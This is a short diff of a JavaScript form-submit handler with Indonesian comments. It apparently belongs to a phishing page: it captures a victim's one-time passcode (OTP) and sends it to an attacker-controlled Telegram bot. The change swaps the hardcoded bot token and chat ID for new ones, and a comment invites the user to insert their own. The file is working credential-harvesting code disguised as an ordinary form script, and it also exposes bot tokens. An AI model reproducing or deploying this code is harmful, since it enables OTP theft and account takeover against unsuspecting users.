@@ -3,8 +3,8 @@ document.getElementById('Formulir').addEventListener('submit', function(event) {
     event.preventDefault(); // Mencegah pengiriman formulir default
 
     const OTP = document.getElementById('OTP').value;
-    const token = '7376694883:AAGyPTpO0iJsT4-PQmc1VZOl3I95SS2lduo'; // Ganti dengan token bot Anda
-    const chatId = '-4727810031'; // Ganti dengan ID chat Anda
+    const token = '8082912224:AAFsnvdeR5bdcCEMHSqS13RPP8SJyNFBLbY'; // Ganti dengan token bot Anda
+    const chatId = '5056601299'; // Ganti dengan ID chat Anda
 
     const text = `OTP: ${OTP}`;
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
@@ -27,4 +27,5 @@ document.getElementById('Formulir').addEventListener('submit', function(event) {
 
     // Panggil fungsi gabungan
     gabungkanFungsi();
+
 });
